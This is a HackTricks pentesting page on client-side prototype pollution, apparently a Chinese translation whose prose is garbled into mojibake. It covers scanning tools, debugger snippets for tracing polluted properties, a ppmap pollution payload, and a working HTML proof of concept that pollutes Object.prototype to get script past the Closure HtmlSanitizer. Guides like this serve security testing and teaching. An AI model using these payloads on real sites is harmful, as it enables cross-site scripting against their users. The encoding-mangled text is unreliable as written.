# å®¢æˆ·ç«¯åŸå‹æ±¡æŸ“

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* ä½ åœ¨ä¸€å®¶**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿä½ æƒ³åœ¨HackTricksä¸­çœ‹åˆ°ä½ çš„**å…¬å¸å¹¿å‘Š**å—ï¼Ÿæˆ–è€…ä½ æƒ³è¦**è·å–PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½PDFæ ¼å¼çš„HackTricks**å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* è·å–[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* **åŠ å…¥**[**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f)æˆ–[**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass)ï¼Œæˆ–è€…**å…³æ³¨**æˆ‘åœ¨**Twitter**ä¸Šçš„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**ã€‚**
* **é€šè¿‡å‘**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **å’Œ**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **æäº¤PRæ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§ã€‚**

</details>

## ä½¿ç”¨è‡ªåŠ¨åŒ–å·¥å…·è¿›è¡Œå‘ç°

å¯ä»¥ä½¿ç”¨å·¥å…·[**https://github.com/dwisiswant0/ppfuzz**](https://github.com/dwisiswant0/ppfuzz?tag=v1.0.0)**,** [**https://github.com/kleiton0x00/ppmap**](https://github.com/kleiton0x00/ppmap) **å’Œ** [**https://github.com/kosmosec/proto-find**](https://github.com/kosmosec/proto-find) **æ¥æŸ¥æ‰¾åŸå‹æ±¡æŸ“æ¼æ´**ã€‚

æ­¤å¤–ï¼Œä½ è¿˜å¯ä»¥ä½¿ç”¨**æµè§ˆå™¨æ‰©å±•ç¨‹åº**[**PPScan**](https://github.com/msrkp/PPScan)æ¥**è‡ªåŠ¨**æ‰«æä½ è®¿é—®çš„é¡µé¢æ˜¯å¦å­˜åœ¨åŸå‹æ±¡æŸ“æ¼æ´ã€‚

### è°ƒè¯•å±æ€§çš„ä½¿ç”¨ä½ç½® <a href="#5530" id="5530"></a>

{% code overflow="wrap" %}
```javascript
// Stop debugger where 'potentialGadget' property is accessed
Object.defineProperty(Object.prototype,'potentialGadget', {__proto__:null, get(){
console.trace();
return 'test';
}})
```
{% endcode %}

### å¯»æ‰¾Prototype Pollutionçš„æ ¹æœ¬åŸå›  <a href="#5530" id="5530"></a>

ä¸€æ—¦ä»»ä½•å·¥å…·**è¯†åˆ«å‡º**äº†**prototype pollutionæ¼æ´**ï¼Œå¦‚æœ**ä»£ç **ä¸æ˜¯éå¸¸**å¤æ‚**ï¼Œä½ å¯ä»¥åœ¨Chromeå¼€å‘è€…å·¥å…·ä¸­**æœç´¢**å…³é”®è¯**`location.hash/decodeURIComponent/location.search`**ï¼Œæ‰¾åˆ°æ¼æ´æ‰€åœ¨çš„ä½ç½®ã€‚

å¦‚æœä»£ç åºå¤§ä¸”å¤æ‚ï¼Œæœ‰ä¸€ç§ç®€å•çš„æ–¹æ³•å¯ä»¥**å‘ç°æ¼æ´ä»£ç æ‰€åœ¨çš„ä½ç½®**ï¼š

* ä½¿ç”¨å…¶ä¸­ä¸€ä¸ªå·¥å…·**æ‰¾åˆ°æ¼æ´**å¹¶è·å–ä¸€ä¸ª**æœ‰æ•ˆè½½è·**ï¼Œè¯¥æœ‰æ•ˆè½½è·å°†åœ¨æ„é€ å‡½æ•°ä¸­**è®¾ç½®ä¸€ä¸ªå±æ€§**ã€‚åœ¨ppmapä¸­ï¼Œä½ å°†å¾—åˆ°ç±»ä¼¼äºï¼š`constructor[prototype][ppmap]=reserved`
* ç°åœ¨ï¼Œåœ¨å°†è¦åœ¨é¡µé¢ä¸­æ‰§è¡Œçš„JSä»£ç çš„**ç¬¬ä¸€è¡Œè®¾ç½®æ–­ç‚¹**ï¼Œå¹¶ä½¿ç”¨æœ‰æ•ˆè½½è·åˆ·æ–°é¡µé¢ï¼Œä»¥ä¾¿**åœ¨é‚£é‡Œæš‚åœæ‰§è¡Œ**ã€‚
* å½“JSæ‰§è¡Œæš‚åœæ—¶ï¼Œ**å°†ä»¥ä¸‹è„šæœ¬ç²˜è´´åˆ°JSæ§åˆ¶å°**ã€‚è¿™æ®µä»£ç å°†åœ¨åˆ›å»ºå±æ€§'ppmap'æ—¶å‘å‡ºæŒ‡ç¤ºï¼Œå› æ­¤ä½ å°†èƒ½å¤Ÿæ‰¾åˆ°å®ƒçš„åˆ›å»ºä½ç½®ã€‚
```javascript
function debugAccess(obj, prop, debugGet=true){

var origValue = obj[prop];

Object.defineProperty(obj, prop, {
get: function () {
if ( debugGet )
debugger;
return origValue;
},
set: function(val) {
debugger;
return origValue = val;
}
});

};

debugAccess(Object.prototype, 'ppmap')
```
è¿”å›åˆ°**æ¥æº**ï¼Œç‚¹å‡»â€œ**æ¢å¤**è„šæœ¬**æ‰§è¡Œ**â€ã€‚è¿™æ ·åšåï¼Œæ•´ä¸ª**javascript**å°†è¢«**æ‰§è¡Œ**ï¼Œppmapå°†å†æ¬¡è¢«æ±¡æŸ“ï¼Œå¦‚é¢„æœŸæ‰€ç¤ºã€‚å€ŸåŠ©ä»£ç ç‰‡æ®µï¼Œæˆ‘ä»¬å¯ä»¥æ‰¾åˆ°ppmapå±æ€§è¢«æ±¡æŸ“çš„å…·ä½“ä½ç½®ã€‚æˆ‘ä»¬å¯ä»¥**ç‚¹å‡»****è°ƒç”¨****å †æ ˆ**ï¼Œç„¶åä¼šå‡ºç°**ä¸åŒçš„**å †æ ˆ**ï¼Œå…¶ä¸­å‘ç”Ÿäº†**æ±¡æŸ“**ã€‚

ä½†æ˜¯åº”è¯¥é€‰æ‹©å“ªä¸€ä¸ªï¼Ÿå¤§å¤šæ•°æƒ…å†µä¸‹ï¼ŒåŸå‹æ±¡æŸ“å‘ç”Ÿåœ¨Javascriptåº“ä¸­ï¼Œå› æ­¤åº”è¯¥é€‰æ‹©é™„åŠ åˆ°.jsåº“æ–‡ä»¶çš„å †æ ˆï¼ˆæŸ¥çœ‹å³ä¾§ï¼Œå°±åƒå›¾åƒä¸­æ‰€ç¤ºï¼Œä»¥äº†è§£å †æ ˆé™„åŠ åˆ°å“ªä¸ªç«¯ç‚¹ï¼‰ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬æœ‰ä¸¤ä¸ªå †æ ˆåœ¨ç¬¬4è¡Œå’Œç¬¬6è¡Œï¼Œé€»è¾‘ä¸Šæˆ‘ä»¬å°†é€‰æ‹©ç¬¬4è¡Œï¼Œå› ä¸ºé‚£ä¸€è¡Œæ˜¯æ±¡æŸ“å‘ç”Ÿçš„ç¬¬ä¸€æ¬¡ï¼Œè¿™æ„å‘³ç€è¿™ä¸€è¡Œæ˜¯æ¼æ´çš„åŸå› ã€‚ç‚¹å‡»å †æ ˆå°†é‡å®šå‘æˆ‘ä»¬åˆ°æœ‰æ¼æ´çš„ä»£ç ã€‚

![](https://miro.medium.com/max/1400/1\*S8NBOl1a7f1zhJxlh-6g4w.jpeg)

## æŸ¥æ‰¾è„šæœ¬å·¥å…·

å·¥å…·æ˜¯**ä¸€æ—¦å‘ç°PPæ¼æ´å°±ä¼šè¢«æ»¥ç”¨çš„ä»£ç **ã€‚

å¦‚æœåº”ç”¨ç¨‹åºå¾ˆç®€å•ï¼Œæˆ‘ä»¬å¯ä»¥**æœç´¢**å…³é”®å­—ï¼Œå¦‚**`srcdoc/innerHTML/iframe/createElement`**ï¼Œå¹¶æŸ¥çœ‹æºä»£ç ï¼Œæ£€æŸ¥æ˜¯å¦ä¼š**å¯¼è‡´javascriptæ‰§è¡Œ**ã€‚æœ‰æ—¶ï¼Œæåˆ°çš„æŠ€æœ¯å¯èƒ½æ ¹æœ¬æ‰¾ä¸åˆ°å·¥å…·ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œçº¯æºä»£ç å®¡æŸ¥ä¼šæ­ç¤ºä¸€äº›ä¸é”™çš„å·¥å…·ï¼Œå¦‚ä¸‹é¢çš„ç¤ºä¾‹ã€‚

### åœ¨Mithilåº“ä»£ç ä¸­æŸ¥æ‰¾PPå·¥å…·çš„ç¤ºä¾‹

æŸ¥çœ‹æ­¤æ–‡æ¡£ï¼š[https://blog.huli.tw/2022/05/02/en/intigriti-revenge-challenge-author-writeup/](https://blog.huli.tw/2022/05/02/en/intigriti-revenge-challenge-author-writeup/)

## é‡æ–°ç¼–è¯‘å—æ¼æ´åº“çš„æœ‰æ•ˆè½½è·

* [https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#prototype-pollution](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#prototype-pollution)
* [https://github.com/BlackFan/client-side-prototype-pollution](https://github.com/BlackFan/client-side-prototype-pollution)

## é€šè¿‡PPç»•è¿‡HTMLæ¶ˆæ¯’å™¨

[**è¿™é¡¹ç ”ç©¶**](https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/)å±•ç¤ºäº†ä½¿ç”¨PPå·¥å…·ç»•è¿‡ä¸€äº›HTMLæ¶ˆæ¯’å™¨åº“æä¾›çš„æ¶ˆæ¯’åŠŸèƒ½ï¼š

* #### sanitize-html

<figure><img src="../../../.gitbook/assets/image (668).png" alt=""><figcaption></figcaption></figure>

* #### dompurify

<figure><img src="../../../.gitbook/assets/image (669).png" alt=""><figcaption></figcaption></figure>

* #### Closure
```html
<script>
Object.prototype['* ONERROR'] = 1;
Object.prototype['* SRC'] = 1;
</script>
<script src=https://google.github.io/closure-library/source/closure/goog/base.js></script>
<script>
goog.require('goog.html.sanitizer.HtmlSanitizer');
goog.require('goog.dom');
</script>
<body>
<script>
const html = '<img src onerror=alert(1)>';
const sanitizer = new goog.html.sanitizer.HtmlSanitizer();
const sanitized = sanitizer.sanitize(html);
const node = goog.dom.safeHtmlToNode(sanitized);

document.body.append(node);
</script>
```
## å‚è€ƒèµ„æ–™

* [https://infosecwriteups.com/hunting-for-prototype-pollution-and-its-vulnerable-code-on-js-libraries-5bab2d6dc746](https://infosecwriteups.com/hunting-for-prototype-pollution-and-its-vulnerable-code-on-js-libraries-5bab2d6dc746)
* [https://blog.s1r1us.ninja/research/PP](https://blog.s1r1us.ninja/research/PP)
* [https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/#:\~:text=my%20challenge.-,Closure,-Closure%20Sanitizer%20has](https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks äº‘ â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* ä½ åœ¨ä¸€å®¶**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿæƒ³è¦åœ¨ HackTricks ä¸­**å®£ä¼ ä½ çš„å…¬å¸**å—ï¼Ÿæˆ–è€…æƒ³è¦**è·å–æœ€æ–°ç‰ˆæœ¬çš„ PEASS æˆ–ä¸‹è½½ PDF æ ¼å¼çš„ HackTricks**å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶ [**NFTs**](https://opensea.io/collection/the-peass-family) é›†åˆâ€”â€”[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* è·å–[**å®˜æ–¹ PEASS & HackTricks å•†å“**](https://peass.creator-spring.com)
* **åŠ å…¥** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegram ç¾¤ç»„**](https://t.me/peass)ï¼Œæˆ–è€…**å…³æ³¨**æˆ‘åœ¨**Twitter**ä¸Šçš„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**ã€‚**
* **é€šè¿‡å‘** [**hacktricks ä»“åº“**](https://github.com/carlospolop/hacktricks) **å’Œ** [**hacktricks-cloud ä»“åº“**](https://github.com/carlospolop/hacktricks-cloud) **æäº¤ PR æ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§ã€‚**

</details>
